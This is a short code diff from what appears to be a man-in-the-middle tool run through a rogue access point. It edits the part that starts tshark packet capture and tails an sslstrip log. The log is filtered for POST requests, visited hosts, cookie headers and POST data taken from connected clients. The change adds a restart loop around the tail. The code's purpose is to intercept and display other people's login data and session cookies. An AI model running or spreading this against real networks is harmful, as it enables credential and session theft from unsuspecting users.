@@ -197,13 +197,19 @@ if sslstrip_if == "y" or sslstrip_if == "":
     if tshark_if == "y" or tshark_if == "":
         print("[I] Starting TSHARK...")
         os.system("sudo screen -S mitmap-tshark -m -d tshark -i " + ap_iface + " -w " + script_path + "logs/mitmap-tshark.pcap")
-    print("\nTAIL started on " + script_path + "logs/mitmap-sslstrip.log... Wait for output... (press 'CTRL + C' to stop)\n HOST-s, POST requests and COOKIES will be shown.\n"")
+    print("\nTAIL started on " + script_path + "logs/mitmap-sslstrip.log...\nWait for output... (press 'CTRL + C' 2 times to stop)\nHOST-s, POST requests and COOKIES will be shown.\n")
     try:
         time.sleep(5)
     except:
         print("")
-    os.system("sudo tail -f " + script_path + "logs/mitmap-sslstrip.log | grep -e 'Sending Request: POST' -e 'New host:' -e 'Sending header: cookie' -e 'POST Data'")
-    #STARTING POINT
+    while True:
+        try:
+            print("[I] Restarting tail in 1 sec...")
+            time.sleep(1)
+            os.system("sudo tail -f " + script_path + "logs/mitmap-sslstrip.log | grep -e 'Sending Request: POST' -e 'New host:' -e 'Sending header: cookie' -e 'POST Data'")
+        except KeyboardInterrupt:
+            break
+            #STARTING POINT
 #SSLSTRIP MODE
 
 
